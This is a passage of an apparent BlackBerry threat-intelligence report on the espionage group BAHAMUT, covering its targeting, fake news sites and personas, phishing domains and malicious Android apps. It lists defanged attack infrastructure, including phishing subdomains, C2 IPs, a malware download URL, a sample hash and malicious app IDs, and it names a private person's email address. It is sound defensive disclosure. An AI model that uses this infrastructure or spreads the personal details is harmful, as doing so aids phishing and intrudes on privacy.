In this report, BlackBerry investigates one of\n\n the most elusive, patient, and effective publicly known threat actors.\n\n We explore BAHAMUT’s historical and present day targeting, as well\n\n as their tradecraft, which includes the use of a vast empire of fake\n\n news websites, social media accounts, and personas. BlackBerry\n\n also identifies more than a dozen BAHAMUT applications still active\n\n in both the Google Play[™] Store and the App Store[™] at the time of\n\n writing. Finally, we explore and endeavor to resolve the intricate threat\n\n intelligence attribution challenge surrounding BAHAMUT that has\n\n beset researchers at nearly 20 different security companies and non-\n\n profit organizations for the last several years.\n\n\n-----\n\n# key  findings\n\n              - BlackBerry assesses with high confidence that BAHAMUT, named by researchers\nwriting for the open-source intelligence site Bellingcat, is the same group described\nin research under the names EHDEVEL, WINDSHIFT, and URPAGE, as well as a group\npreviously identified by Cylance as THE WHITE COMPANY. In addition, we also assess\nBAHAMUT to be the same unnamed actor described in Kaspersky’s 2016 “InPage zero-\nday” research, Cisco Talos’ more recent “Malicious MDM” research, and Qianxin’s 2018\n“Analysis of Targeted Attack Against Pakistan” research.\n\n               - BAHAMUT engages in an incredibly diverse and wide range of targeting. BlackBerry\nobserved them focus narrowly on high ranking government officials and titans of\nindustry in India, the Emirates, and Saudi Arabia, as well as in more dragnet fashion on\nthose who advocate for Sikh separatism or support human rights causes in the Middle\nEast. BlackBerry endeavored to notify as many of the individual, governmental, and\ncorporate/non-profit targets as possible prior to the publication of this report.\n\n               - We assess that BAHAMUT likely has access to at least one zero-day developer, and we\nobserved the group make use of zero-day exploits across an array of targets in expertly\ntailored fashion, reflecting a skill-level well beyond most other known threat actor\ngroups. In this report, we document new findings about an exploit targeting the word\nprocessing software InPage, which is popular in Urdu, Arabic, and Persian speaking\ncountries, and whose most prominent users include nearly all the major newspapers in\nPakistan and India.\n\n               - BlackBerry assesses that the InPage zero-day exploit first identified by Kaspersky in\n2016 and given CVE-2017-12824 but never attributed, was in fact used by BAHAMUT.\nWe also assess that it was first developed by a Chinese threat group in 2009 for use\nin targeting a group in diaspora perceived to be a potential threat to the power of the\nChinese Communist Party.\n\n              - We assess that BAHAMUT is the actor behind more than a dozen malicious\napplications available in both the Google Play Store and the App Store at the time of\nauthorship (July 2020). BlackBerry has brought this to the attention of both Google\nand Apple.\n\n               - BlackBerry finds that BAHAMUT presides over a significant number of fake entities,\nfrom social media personae to websites to applications, some of which had no\nimmediately discernable malicious purpose, but which generated original content and\nseemed to distort the readers’ perception of reality.\n\n\n-----\n\n-----\n\n### Intoduction\n\nBAHAMUT is the name given to a gigantic sea monster that helps hold up the earth in a genesis\nstory. Arabic in origin, the story of the Bahamut is included in Edward Lane’s Arabian Society in the\n_Middle Ages and an excerpt of Lane’s translation appears in Jorge Luis Borges’ Book of Imaginary_\n_Beings. Borges likens the Bahamut to the Biblical Behemoth – a creature “so immense…that human_\neyes cannot bear to look at it” (Borges, 1967). Fans of Dungeons & Dragons and of Final Fantasy\nwill recognize it as the name of a dragon of terrifying power.\n\nBAHAMUT is also the name given to a cyberespionage threat actor by researchers writing for\nBellingcat in 2017. The researchers, Collin Anderson and Claudio Guarnieri, invoked Borges’\ndescription in lieu of any “personally-identifiable information or even descriptive identifiers within\nthe campaigns” (Anderson & Guarnieri, Bahamut, Pursuing a Cyber Espionage Actor in the Middle\nEast, 2017). In the same breath, they highlighted the “constant struggle” in attributing attacks to\nthis group – a sentiment we at BlackBerry appreciate.\n\nOver the years, researchers at several other organizations including Amnesty International,\nKaspersky, Trend Micro, Cymmetria, DarkMatter, ESET, Norman, Antiy, Forcepoint, Symantec, Palo\nAlto, Fortinet, 4Hou, bitdefender, Cisco Talos, Microsoft, Qianxin, and others, gave us a different\nview of BAHAMUT, often under different names. Many speculated openly about what it was they\nwere analyzing, and where the group’s distinctive features might lead them. Were they all looking\nat the same thing? Drilling down into overlaps in malware, infrastructure, and exploits between\nnumerous, differently named groups quickly becomes a behemoth of a task.\n\nDefining BAHAMUT is especially difficult in light of the fact that the group is suspected of re-using\nother groups’ tools and imitating their tradecraft. BAHAMUT also heavily leverages publicly available\ntools that further obscure attribution. The group takes great pains to keep its campaigns, network\ninfrastructure, and phishing tools separate from one another. Anti-analysis features are often built\ndirectly into backdoors as well as exploit shellcode. When exposed, the group changes tactics\nimmediately and learns from its mistakes, even when those tactics aren’t explicitly called out in\nresearch. BAHAMUT’s targeting is all over the map, which makes it difficult to concoct a single\nvictimology. BAHAMUT appears to be not only well-funded and well-resourced, but also well-versed\nin security research and the cognitive biases analysts often possess. Taken together, these aspects\npresent a considerable attribution challenge.\n\nIn the pages that follow, we present our best effort at describing BAHAMUT, making the case for\nconnections between previously identified groups. As always, what follows is an assessment made\nwith the information available to us at the time of writing; it is not intended to be prescriptive and\nshould not be taken as such.\n\nWe start our journey with a look at the group’s current and historical targeting before moving on to\nanalyze its recent tradecraft. We end with a serpentine journey through other public research about\nthe group, and conclude with our own assessments about the true nature of the beast, BAHAMUT.\n\n\n-----\n\n-----\n\n###### Historical Targeting\n\nWriting for the open-source intelligence and investigative journalism site Bellingcat in June of 2017,\nCollin Anderson and Claudio Guarnieri placed particular emphasis on BAHAMUT’s victimology\n(Anderson & Guarnieri, Bahamut, Pursuing a Cyber Espionage Actor in the Middle East, 2017). They\nperceived BAHAMUT to be focused on political, economic, and social sectors in the Middle East,\nwith an effort on targeting individuals as opposed to organizations.\n\nThe targets they identified included both Middle Easterners and non-Middle Easterners. Among the\nlatter, they wrote, were Swiss and British nationals who had prolonged interests in the Middle East\n“as journalists, diplomats, or human rights advocates.” They stated, “Of those clearly identifiable,\nthe targets have been primarily located in Egypt, Iran, Palestine, Turkey, Tunisia, and the United\nArab Emirates.” Among them were the following targets, which BlackBerry quotes directly from\nBellingcat’s research but presents below in a manner that splices them together for ease of viewing:\n\n- Iranian women’s rights activists\n\n- Turkish government officials\n\n- Saudi Aramco\n\n- A Europe-based human rights organization focused on the region\n\n- [People] connected to Qatar’s domestic and international politics\n\n- [A] company that provided financial services that caters to high-net-worth clients with an\nemphasis on confidentiality\n\n- Egypt-focused media and foreign press, including individuals previously imprisoned in\nthe country\n\n- Multiple Middle Eastern human rights NGOs and local activists\n\n- A diplomat in the Emirati Ministry of Foreign Affairs, the Emirati Minister of State for Foreign\nAffairs, and the head of an Emirati foreign policy think tank\n\n- A prominent Sufi Islamic scholar\n\n- The Union of Arab Banks\n\n- A Delegate of Turkey to UNESCO\n\n- The Turkish Minister of Foreign Affairs\n\n- A relative of the President of Iran\n\n- A women’s rights activist and a prominent female journalist in the diaspora\n\n- A reformist politician who was an advisor to the former President Khatami\n\n- The Prime Minister’s Court of Bahrain\n\n- The Saudi Minister of Energy\n\n- A former member of the Saudi Arabian National Security Council\n\n\n-----\n\nBlackBerry later found that researchers at other organizations also had various views of BAHAMUT\nand its targeting, but they called the threat actor by a number of different names. From this survey\nof prior research, BlackBerry learned that another cluster of BAHAMUT’s targeting was centered in\nSouth Asia, with India and Pakistan as the most commonly involved countries. Still another focus,\nespecially in the Chinese security research, was China. In some cases, we saw researchers claim to\nidentify targets reaching into northern and eastern Europe. BlackBerry learned that BAHAMUT was\nunderstood to be interested principally in government and military organizations, private individuals,\nand companies involved in technology, media, aerospace, and financial industries. We also found\nthat BAHAMUT’s targeting varied widely over time, and appeared to generally avoid assets and\ntargets located in the United States.\n\nIn sum, what emerged from the past research was clustered targeting around two primary areas:\nSouth Asia (particularly India and Pakistan), and the Middle East (particularly the UAE and Qatar).\nBlackBerry assesses that the wide range of targeting, both in terms of geography and subject, lends\ncredence to the Bellingcat theory that BAHAMUT was a “hacker for hire” operation.\n\n###### Present Day Targeting\n\nBlackBerry’s analysis of BAHAMUT’s current targeting reveals that the group’s interests remain\nconcentrated around groups and individuals in the same areas of focus: South Asia and the\nPersian Gulf.\n\nSome of BAHAMUT’s current phishing infrastructure reflects a sustained interest in credential\nharvesting from users of popular Western sites like Google[™], Microsoft[®], Yahoo![®], and Telegram, no\nmatter where they might reside. BlackBerry additionally discovered targeting of users of Sina, QQ,\n126, and 163, which are primarily used in China.\n\nIn the Middle East, BlackBerry observed phishing of government agencies, private businesses, and\nindividuals. The majority of the targeting, however, was aimed at government. In Saudi Arabia, that\nincluded the targeting of seven different ministries and other agencies, with an added emphasis\non monetary and financial policy. BlackBerry observed targeting of other government ministries in\nthe Emirates, Qatar, Bahrain, and Kuwait, this time with an emphasis on foreign policy and defense.\n\nOf the private entities phished in the Emirates, one target stood out: an Emirati IT company named\nin the July 2015 Wikileaks dump of more than one million emails purportedly belonging to the\ncommercial spyware vendor Hacking Team. Documents released by WikiLeaks portrayed the\ncompany as a cutout between Hacking Team and the Emirati government. This relationship was\nrepresented in documents and invoices involving the UAE Air Force, as seen here:\n\n[https://www.wikileaks.org/hackingteam/e-mails/e-mailid/605068](https://www.wikileaks.org/hackingteam/e-mails/e-mailid/605068)\n\n[https://wikileaks.org/hackingteam/e-mails/e-mailid/616884](https://wikileaks.org/hackingteam/e-mails/e-mailid/616884)\n\n[https://www.wikileaks.org/hackingteam/e-mails/e-mailid/568646](https://www.wikileaks.org/hackingteam/e-mails/e-mailid/568646)\n\nWe observe that BAHAMUT’s targeting in the Middle East also takes a wider, more dragnet approach\nin the form of mobile phone applications. A more thorough discussion of the fake applications,\nmany of which were available for download in the Emirates, can be found later in the section called\nTradecraft: Malicious Mobile Applications. It’s worth noting here that they appeared intended for\ngeneral audiences; the iOS[®] applications did not carry political overtones.\n\n\n-----\n\nConversely, BAHAMUT’s fake applications targeting South Asians were largely political in nature.\nThere was a common theme among them with the targeting of groups like Sikhs for Justice, and\nIslamist groups active in the disputed Kashmir region, like Jamaat-ul-Islami and Jaish-e-Mohammad.\n\nBAHAMUT’s South Asian phishing targets are focused on individuals of greater importance in private\nindustry, in contrast to the heavy government themed phishing in the Gulf. Indeed, BlackBerry did\nnot find any Indian government agencies or individuals among its current target sets.\n\n\n-----\n\n-----\n\n### Tradecraft: The “Fake” Empire\n\nPerhaps the most distinctive aspect of BAHAMUT’s exceptional tradecraft is their use of original,\npainstakingly crafted websites, applications, and personas. Across a dizzying array of industries and\nglobal cities, BAHAMUT fashions a convincing veneer of legitimacy. In doing so, the group distorts\nconsumers’ perception of reality. At a moment in time when allegations of “fake news” are all the\nrage and news organizations are constantly on the defensive, BAHAMUT’s targets are left with the\narduous task of avoiding traps set to mislead, misinform, and misdirect.\n\nFirst encounters with BAHAMUT begin innocently. One might start with a simple direct message\non Twitter[®] or LinkedIn[®] from an attractive woman, but with no suspicious link to click. Another\nmight occur when scrolling through Twitter or Facebook[®] in the form of a tech news article. Maybe\nyou’d be taking a break at work and checking out a fitness website. Or perhaps you’re a supporter\nof Sikh rights looking for news about their movement for independence. You’d click, and nothing\nbad would appear to happen. On the contrary, you’d experience a legitimate, yet fabricated reality.\n\nIn many, though not all cases, targets wouldn’t see a copycat of genuine content, but rather would\nengage with original content. There would be no malware, no phishing, and no malicious links. It\nmight be just a review of a new Android[™] phone, or an article about the latest high-profile hack in the\nU.S. It might be a normal conversation with someone on Twitter. All of this would leave the target\nor other reader with questions: Were the people and content engaged with even real? Was the news\narticle legitimate? What BlackBerry discovered was that in reality, targets would have encountered\na world expertly tailored to their interests – except with BAHAMUT’s best interest at heart. Targets\nwill have ventured into BAHAMUT’s vast fake empire.\n\n###### The Techsprouts Hall of Mirrors\n\nBeing the first to publicize or spread an idea, regardless of what it may be, has often been all it\ntakes for that idea to manifest and take hold in the real world. BAHAMUT realized the power of this\ntechnique and operationalized several different fake news sites at various points in time. One of\nthe first was identified and documented by Collin Anderson, writing for Bellingcat in 2017: Times\nof Arab, “timesofarab[.]com”. Bellingcat was unable to assess its true purpose at the time it was\nactive. It appeared to merely mirror other legitimate news articles.\n\nIn the years since, BlackBerry managed to identify another, currently active technology news site\nthat generated original content on a routine basis: Techsprouts (“techsprouts[.]com”). Would you\nbe able to determine it was a fake? Maybe, but it fooled even the seasoned experts at Ireland’s\nNational Cyber Security Centre, who cited it in an industry news alert (National Cyber Security\nCentre of Ireland, 2019).\n\n\n-----\n\n_Figure 1: National Cybersecurity Centre of Ireland page as of July 2020._\n\n\n-----\n\n_Figure 2: Techsprouts.com homepage as of July 27, 2020_\n\nOur research into the history of the Techsprouts domain led us to assess that it was originally\na legitimate website, one that focused predominantly on reviews of mobile devices. BlackBerry\nidentified the website’s original owner via the email used to register the domain, which was revealed\nafter privacy services had lapsed: “nitin.agarwal.1988[at]hotmail.com”. BlackBerry then tied this\nemail to the following Facebook account: “https://www.facebook.com/NitinAgarwal198/”, the\nowner of which last posted on July 17, 2019. It appears that Nitin Agarwal is a freelance technology\njournalist and reviewer in India.\n\n\n-----\n\n_Figure 3: Snapshot of Nitin Agarwal’s Facebook page_\n\nWithin the past year, however, BAHAMUT appears to have re-registered the Techsprouts domain\nand continued to operate it. After doing so, the roster of “contributors” did not appear to change.\nLet’s consider these contributors for a moment. As seen below in For example, the image of “Alice\nJane”, a senior writer, was actually that of Julie Luck, the evening anchor at the local CBS station\nin Greensboro, North Carolina (https://www.wfmynews2.com/article/about-us/team-bios/julieluck/83-47896832). She was not the only broadcast journalist whose image was repurposed by\nTechsprouts. The photo of “Allen Parker” was actually that of Brian Shrader, a reporter and anchor\nat the local NBC affiliate in Raleigh, North Carolina (https://www.wral.com/rs/bio/2543620/)., their\nbiographies are impressive, but upon further inspection, it is apparent that the thumbnail photos\nof each author seen throughout the site have been appropriated from other sites and other people\nwith quite different names.\n\nFor example, the image of “Alice Jane”, a senior writer, was actually that of Julie Luck, the evening\n[anchor at the local CBS station in Greensboro, North Carolina (https://www.wfmynews2.com/](https://www.wfmynews2.com/article/about-us/team-bios/julie-luck/83-47896832)\n[article/about-us/team-bios/julie-luck/83-47896832). She was not the only broadcast journalist](https://www.wfmynews2.com/article/about-us/team-bios/julie-luck/83-47896832)\nwhose image was repurposed by Techsprouts. The photo of “Allen Parker” was actually that of\n[Brian Shrader, a reporter and anchor at the local NBC affiliate in Raleigh, North Carolina (https://](https://www.wral.com/rs/bio/2543620/)\n[www.wral.com/rs/bio/2543620/).](https://www.wral.com/rs/bio/2543620/)\n\n\n-----\n\n_Figure 4: Images of Alice Jane from Techsprouts (left) and Julie Luck of WFMY 2 (right)_\n\n_Figure 5: Techsprouts masthead as of July 2020_\n\n\n-----\n\nIn a similar vein, the photo of “Kanisha Parks” was really that of Ashley Barnes. The image of\n“Joshua Bartholomew” was a photo of Ron Walker. The picture of “Allen Parker” belonged to Bryan\nShrader. “Mary Woods” – Delma Pedraza. “Ashlyn Fernandes” – David Walker. And the likeness of\nTechsprouts’ Editor-in-Chief, “Graylan Janulus” was actually a different photo of a different man\nalso named David Walker.\n\n_Figure 6: Beginning on top, left to right, “Kanisha Parks”, Ashley Barnes, “Joshua Bartholomew”, Ron Walker, “Allen Parker”,_\n_Bryan Shrader, “Mary Woods”, Delma Pedraza, “Ashlyn Fernandes”, David Walker, Techsprouts Editor-in-Chief, “Graylan_\n_Janulus”, and David Walker._\n\nAfter pausing to consider the images on the site, BlackBerry then focused on the articles themselves.\nAfter the BAHAMUT takeover of the Techsprouts domain, we noticed a change in the tone and\nsubject matter of the articles. The mobile device reviews remained, but there were now more articles\nthat touched on security research and geopolitical themes. Given this change, we wondered whether\nthe “Nitin Agarwal” persona had any continued association with the website. Based on the number\nand frequency of his posts, it appears he may very well have. In fact, it appears that he crossed\nover to cover the more serious topics, too. The author “techno245” signed his posts with the handle\n“nitin198” as seen on “https://techsprouts.com/author/techno245/” as well as in the figure below:\n\n\n-----\n\n_Figure 7: Techsprouts articles authored by Nitin198 as of July 2020._\n\nIn reviewing the recent news articles, BlackBerry noticed that Techsprouts closely follows the goings\non of private security companies like the NSO Group, which sells offensive cyber tools and services\nto governments and law enforcement.\n\n\n-----\n\n###### Techsprouts – More Than Meets the Eye\n\nLooking now at the Techsprouts website from a technical angle, BlackBerry was uncertain at first\nas to what to make of it, given that its creators went to the trouble to create and maintain Twitter\nand Facebook pages with so few followers – something we found to be unusual for a news site:\n\n“https://twitter[.]com/techsproutmedia”\n\n“https://www.facebook[.]com/techsproutsnews/”\n\n_Figure 8: Techsprouts social media accounts as of July 2020._\n\n\n-----\n\nBut when we investigated the subdomain, “mail.techsprouts[.]com”, it led to us to our assessment\nthat BAHAMUT is in control of the Techsprouts website. We made this assessment via three\nmeans. First, and most importantly, this domain contains a network service fingerprint unique to\nBAHAMUT. Second, the domain in question pointed to the IP address “185.122.58[.]133”. This IP\nwas configured identically to other BAHAMUT-controlled websites including Windows[®], Android[™], and\niOS command-and-control (C2) servers, from a ports and services perspective. While it is running\nc-panel, an extensive review of passive DNS history of domains pointing to that IP address showed\nthat only domains associated with BAHAMUT ever resolved to it. Third, a self-signed SSL certificate\nprovided an additional indication that this was not in fact a false positive: “https://beta.shodan.io/\nhost/185.122.58.133/history#993”. This certificate was active on the IP at the time of authorship.\n\n\nCertificate:\n\nData:\n\nVersion: 3 (0x2)\n\nSerial Number: 6663839162 (0x18d321dba)\n\nSignature Algorithm: sha256WithRSAEncryption\n\nIssuer: e-mailAddress=ssl@dfaqpgtr.vbfgt.com, CN=dfaqpgtr.vbfgt.com\n\nValidity\n\nNot Before: Nov 8 00:43:27 2019 GMT\n\nNot After : Nov 7 00:43:27 2020 GMT\n\nSubject: e-mailAddress=ssl@dfaqpgtr.vbfgt.com, CN=dfaqpgtr.vbfgt.com\n\nSubject Public Key Info:\n\nPublic Key Algorithm: rsaEncryption\n\nRSA Public-Key: (2048 bit)\n\nModulus:\n\n00:a1:e8:28:15:4b:78:f4:44:71:41:b7:e2:82:15:8d:40:08:eb:7f:9a:fe:30:6d:3e:bc:6c:05:ad:ba:\n\n38:1c:f7:0f:f6:5c:84:94:e1:69:1f:2a:6b:43:f6:46:8e:ff:af:64:7b:25:84:ed:db:ee:98:47:19:22:\n\n14:b5:60:14:4c:bb:9f:3f:f5:d6:cb:ec:c8:c0:f7:e3:b3:3a:1a:b3:9e:42:19:dd:66:e7:b5:5e:4c:e0:\n\n48:b2:67:88:47:a7:7c:69:98:32:f0:9d:f8:f9:11:5e:0c:83:e2:2c:fc:f8:a4:bc:a9:1c:4f:24:58:72:\n\n62:a1:42:8f:f4:9d:46:09:cf:a9:c7:a7:1c:75:4a:8f:b8:6d:a8:01:84:14:d0:c4:62:95:98:7c:44:e2:\n\n5c:a3:dc:43:ad:28:7d:33:e9:78:6f:8e:dd:bc:05:be:fd:3a:01:db:c7:f3:19:9a:ca:7f:68:db:68:b9:\n\n66:c4:52:13:b4:64:bd:a0:32:4d:c9:c1:46:d4:c0:8d:2f:84:9f:98:5b:25:58:d4:f0:3f:ef:dc:64:4e:\n\nf6:27:dc:ea:e8:0b:32:58:c8:70:44:d7:f9:f0:14:f6:9b:48:76:58:10:61:6b:72:17:c3:61:15:b0:89:\n\n8e:0b:08:00:4a:b2:b7:38:24:b9:39:9b:41:94:bf:e8:4b\n\nExponent: 65537 (0x10001)\n\n[truncated]\n\n\n_Figure 9: SSL certificate present on the IP Address 185.122.58.133_\n\nSelf-signed certificates are not sufficient evidence if standing alone, but they are typically not used\nin a production server, and this one provided an additional data point to support our assessment.\nAll the other SSL certificates associated with “techsprouts[.]com” were issued by Cloudflare and\nthe primary news site itself was sitting behind their proxy services. BlackBerry continued to browse\nthis website periodically, but we did not find anything overtly malicious hosted on the site.\n\n\n-----\n\nSo, what is the true purpose of Techsprouts? Why would BAHAMUT go through the trouble of running\nan information security news site if it isn’t malicious? Here the trail of evidence we can point to goes\ncold. Researcher Taha Karim, author of the WINDSHIFT research (which BlackBerry examines in\nthe Attribution section and associates with BAHAMUT), posited that the group used sites like this\n(though not Techsprouts specifically) as a way to discern the click habits of their targets. But Karim\ndidn’t provide any publicly available evidence. Without more information, BlackBerry is unable to\nverify this theory, though it certainly seems well within the realm of possibility.\n\n###### Expansion of the Fake Empire\n\nHaving come back through the looking glass, BlackBerry expanded the search for other BAHAMUT\ncontrolled “fake” sites. Using a unique network service fingerprint, BlackBerry found a host of\nadditional websites we assess to be under the control of BAHAMUT. Some of them also served\nmalware or exploits we associate with BAHAMUT. Others tied into BAHAMUT phishing servers, or\nacted as C2 for BAHMAUT backdoors. The following websites were either operationalized for brief\nperiods of time or were still active at the time of writing.\n\n\n-----\n\n_Table 1: Fake websites employed by BAHAMUT for various purposes_\n\n\n-----\n\nIncluded in this list are sites reflecting a remarkable range of varied interests, most of which have\nnothing to do with one another and left us scratching our heads. For example, first on the list is a\nsite that mimics a famous purveyor of zero-day exploits. Last is a site that imitates that of a real\nSikh political group.\n\nSeveral of the fake websites BlackBerry identified deal directly with a common theme: the 2020\nSikh Referendum, which has been a hotbed issue within India since late last year. This is essentially\na secessionist movement, the brainchild of an organization called “Sikhs for Justice” (SFJ), which\n[was banned by the Government of India on July 10, 2019 (See here: http://www.diprpunjab.gov.](http://www.diprpunjab.gov.in/?q=content/tribunal-issues-notice-sikhs-justice)\n[in/?q=content/tribunal-issues-notice-sikhs-justice; https://www.mha.gov.in/sites/default/files/](http://www.diprpunjab.gov.in/?q=content/tribunal-issues-notice-sikhs-justice)\n[SikhsForJustice_11092019_0_0.pdf). The U.S.-based group is largely comprised of individuals](https://www.mha.gov.in/sites/default/files/SikhsForJustice_11092019_0_0.pdf)\noutside of India who support the secession of the Sikh territory in India’s northern state of Punjab\nfrom India. Their intent is to recreate the original Sikh-held land that predates the partition of India\nand Pakistan in the 1940s. This territory, referred to as Khalistan, crosses the modern-day border\ninto parts of Pakistan where the Sikh guru who founded the religion is from.\n\nSikhs for Justice (SFJ) was founded and headed by a lawyer, now residing in Queens, NY, named\nGurpatwant Singh Pannu. Pannu describes his advocacy as a human rights campaign. But the\nIndian government views him differently, having declared him an “individual terrorist” on July 1, 2019\n[(http://diprpunjab.gov.in/?q=content/punjab-police-file-2-firs-against-pannu-his-associates-charges-](http://diprpunjab.gov.in/?q=content/punjab-police-file-2-firs-against-pannu-his-associates-charges-sedition-secessionism)\n[sedition-secessionism). Indian government officials even successfully petitioned Google to have the](http://diprpunjab.gov.in/?q=content/punjab-police-file-2-firs-against-pannu-his-associates-charges-sedition-secessionism)\nSFJ referendum application removed from the Google Play Store in November of 2019 (ET Bureau,\n[2019) (See: http://www.diprpunjab.gov.in/?q=content/google-accepts-punjab-cm%E2%80%99s-](http://www.diprpunjab.gov.in/?q=content/google-accepts-punjab-cm%E2%80%99s-demand-takes-down-mobile-app-2020-sikh-referendum-its-play-store)\n[demand-takes-down-mobile-app-2020-sikh-referendum-its-play-store). However, a version of the](http://www.diprpunjab.gov.in/?q=content/google-accepts-punjab-cm%E2%80%99s-demand-takes-down-mobile-app-2020-sikh-referendum-its-play-store)\napplication was still available in the App Store at the time of authorship and could be found here:\n[https://applications.apple.com/us/app/register-2-vote-2020-khalistan/id1489634629.](https://apps.apple.com/us/app/register-2-vote-2020-khalistan/id1489634629)\n\n_Figure 10: Referendum 2020 in the App Store as of July 2020_\n\n\n-----\n\nSome Indian government officials have even speculated that Sikhs for Justice is secretly propped\nup by the Pakistani military and intelligence service in an attempt to destabilize the region (See, for\n[example: http://www.diprpunjab.gov.in/?q=content/pannu%E2%80%99s-statement-seeking-pak-](http://www.diprpunjab.gov.in/?q=content/pannu%E2%80%99s-statement-seeking-pak-army-help-%E2%80%98liberate%E2%80%99-punjab-exposes-sfj%E2%80%99s-nexus-isi-says-capt)\n[army-help-%E2%80%98liberate%E2%80%99-punjab-exposes-sfj%E2%80%99s-nexus-isi-says-capt).](http://www.diprpunjab.gov.in/?q=content/pannu%E2%80%99s-statement-seeking-pak-army-help-%E2%80%98liberate%E2%80%99-punjab-exposes-sfj%E2%80%99s-nexus-isi-says-capt)\n\nFollowing that line, BlackBerry identified several domains that were used by BAHAMUT to actively\ntarget SFJ sympathizers en masse. They all had the same network service fingerprint and served\nBAHAMUT malware:\n\nInfluence Operation\n\n- justsikhthings[.]com\n\n- https://twitter[.]com/justsikhthings?lang=en\n\n- https://www[.]youtube.com/channel/UCYp4JKrnbbETwl9x7URrxPA\n\nEmail and Phone Number Harvesting:\n\n- freepunjab2020[.]info\n\n- sikhforjustice[.]org\n\nServed Android Malware (Details in Section Below):\n\n- khalistanlehar[.]com\n\n- sikhforjustice[.]org\n\nUnknown Purpose:\n\n- yes2khalistanis[.]com\n\n_Figure 11: Screenshot of freepunjab2020.info_\n\n\n-----\n\nBlackBerry was able to determine the above website was fake based upon a common error message\nthat was shown on both “freepunjab2020[.]info” and “sikhforjustice[.]org”:\n\n_Figure 12: Similar error messages served from “sikhforjustice.org” and “freepunjab2020.info”_\n\nThe file “IP-TRACKER/trench[.]php” was available on both servers and returned a similar error\nmessage. It appeared that the paths on both servers utilized the names of gods from Lithuanian\nmythology as usernames: “Nonadievis” and “Dvargantis.” Both websites were also hosted on\nLithuanian IP addresses. BlackBerry was further able to retrieve an Android sample with the hash\n“4d1f32b2707f7171f51aac33ea837ef5015a0365c8edba2f969491c5d414ae51” from the URL:\n“http://sikhforjustice.org/download/sfj[.]apk”. This sample shared a common prefix for its encryption\nkey with several other BAHAMUT samples: K&M9B#)O (See others in the Appendix).\n\nIn addition, BlackBerry discovered that many of the above-referenced Sikh themed sites and malware\nwere served from the following Twitter account: https://twitter[.]com/Anjali14382585:\n\n_Figure 13: Screenshots of @Anjali14382585 taken August 2020_\n\nOther BAHAMUT sites, like “bulletinalerts[.]com,” copied headlines directly from reliable news\nsources, in this case the South China Morning Post. Why BAHAMUT would go to the trouble didn’t\nmake much sense until BlackBerry dug a little deeper.\n\n\n-----\n\n_Figure 14: “About” page from “bulletinalerts[.]com”_\n\nThis page listed a different email with a different domain in the “About Us” section. This email\n“feedback[at]bulletinnews.com” actually pointed to the email address “zilinguan47[at]gmail.com”.\nConveniently, BlackBerry found a Twitter account with the same handle: “@zilinguan47”.\n\n_Figure 15: @zilinguan47 Twitter page as of July 2020._\n\n\n-----\n\nHere, BAHAMUT used another young woman’s picture. The account had a gap in activity of nearly a\nyear and a half. In October of last year, though, “she” sent a Tweet with a bit.ly link, “bit[.]ly/2lRVDnM”:\n\n_Figure 16: Expansion of bit.ly link posted in BAHAMUT controlled Twitter account_\n\nIt’s possible to see the destination of a bit.ly link without using a URL expansion service by adding\na “+” symbol to the end of the URL. In this case, the URL redirected to another simple custom\nredirection service which would in turn send the user to the following address: “https://accoutnsrnail-oath.everification-session-load.com/exte.dwe.llprits.cnty7r8q/index[.]php”. This domain\nresolved to the IP address “81.176.239[.]92” when the persona “@zilinguan47” posted it in October\n2019. This particular domain, “everification-session-load[.]com”, was used to phish users of several\ndifferent platforms including Sina and Yahoo!. The base domain was active from July 19, 2018\nup until the time of the authorship. RiskIQ recorded several other BAHAMUT-related phishing\nsubdomains on this same IP address including:\n\n- m0-rnaiil-siina-chn-reload.everification-session-load[.]com\n\n- rnaiill2-rnaill-slna-m0.everification-session-load[.]com\n\n- rnail-appld-oath-varfiction.everification-session-load[.]com\n\n- vlprnaiill2-rnaill-slna.m0.everification-session-load[.]com\n\nIn the list above, the “siina” and “slna” text is meant to approximate “Sina.” The “oath” reference in\nthe third bullet point is a direct reference to Yahoo!. The depths of what BlackBerry uncovered in\nexploring BAHAMUT’s fake empire went quite a bit deeper. Out of consideration for the fact that\nany additional information on the group’s extensive network of “fakes” released publicly will cause\nthem to be shut down quickly, we will end the discussion here for now.\n\n\n-----\n\n## Malicious Mobile Applications\n\n\n-----\n\n### Tradecraft: Malicious Mobile Applications\n\n###### Operation BULL – Android\n\nUpon reviewing the Android samples listed in Trend Micro’s URPAGE research (Lunghi & Xu,\nThe Urpage Connection to Bahamut, Confucius and Patchwork, 2018), BlackBerry uncovered an\nassortment of new Android applications. We assess that the majority of the applications described\nin Trend Micro’s research are directly attributable to BAHAMUT. The connections were made in two\nmain ways. First, the C2 configuration between the historic samples presented in their research\nand the ones we found matched identically. Second, the same unique network service fingerprint\nwas present, and this allowed us to tie the Android applications to BAHAMUT with high confidence.\n\nAs was the case with BAHAMUT’s “fake news” assets described above, these new, previously\nundiscovered Android applications all came complete with impressively well-designed websites,\nwell-defined privacy policies, and even clearly written terms of service(s). These are details often\noverlooked by threat actors, even those understood to be working with the benefits and resources\nthat come along with government sponsorship.\n\n\n-----\n\n_Figure 17: Screenshots of the PrimeHD Player cover site_\n\nThe applications were well cloaked and managed to bypass Google’s static code safeguards. As\nof July 2020, five of them were still available in the official Google Play Store at the following URLs:\n\n[• https://play.google[.]com/store/apps/details?id=com.callrecording.recorder](https://play.google[.]com/store/apps/details?id=com.callrecording.recorder)\n\n[• https://play.google[.]com/store/apps/details?id=ramadan.com.ramadan](https://play.google[.]com/store/apps/details?id=ramadan.com.ramadan)\n\n[• https://play.google[.]com/store/apps/details?id=com.realmusic](https://play.google[.]com/store/apps/details?id=com.realmusic)\n\n[• https://play.google[.]com/store/apps/details?id=com.musicupnew](https://play.google[.]com/store/apps/details?id=com.musicupnew)\n\n[• https://play.google[.]com/store/apps/details?id=com.hdmediaplayer](https://play.google[.]com/store/apps/details?id=com.hdmediaplayer)\n\n\n-----\n\n_Figure 18: Screenshots of BAHAMUT’s Android malware currently in the Google Play Store_\n\nA sixth application was likely removed by Google in early 2020, https://play.google[.]com/store/\napps/details?id=chat.talktou.com.talktoyou. However, it was active in the store for well over a year\nand updated on four separate occasions prior to removal.\n\nInterestingly, when BlackBerry went to the Play Store to retrieve these applications, we found\nthey were region-locked to specific countries. While BlackBerry was not able to enumerate all the\nimpacted/targeted countries where download was possible, we were able to determine that the\nEmirates was among them. This told us that the applications were, at the very least, intended for\ntargets in the UAE.\n\n\n-----\n\nThe five applications investigated were purportedly created by different developers. They included an\napplication that enabled the recording of phone calls (with more than 1000 installs), an application\ndesigned to prompt the Muslim faithful about prayer times during Ramadan (only 10 installs),\ntwo music players (each with more than 1000 installs, and one of which had gone through 